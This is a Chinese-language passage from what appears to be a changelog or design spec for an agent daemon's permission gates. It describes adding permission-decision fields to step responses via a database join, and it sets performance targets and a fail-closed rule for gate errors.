- **`run.steps` 响应新增 `permission_decision`/`permission_decided_by`**（PRD 12.1 G07）：原响应只有 `permission_id`——`permission_decisions` 表的主键，不是 allow/deny 结果本身——且没有任何 RPC 路径能把这个 id 换成实际裁决。`sessions/queries.py::list_run_steps` 现在 LEFT JOIN `permission_decisions ON permission_decisions.id = steps.permission_id`，把 `decision`（`pending`/`allow`/`deny`）与 `decided_by` 直接带在每个 Step 行上；未触发权限闸的 Step 两个新字段保持 NULL。纯新增字段，向后兼容，不改 `permission_id` 本身的含义。

## 3. 全体

- 性能：规则闸零 IPC；审查闸纯计算 < 1ms；用户闸等待不占 worker CPU；回放 payload 写入异步、不阻塞 ACP 读循环。报告里给数字。
- 诚实失败：任何闸出错 → **拒绝**（fail-closed）并推 `daemon.error`，绝不放行。
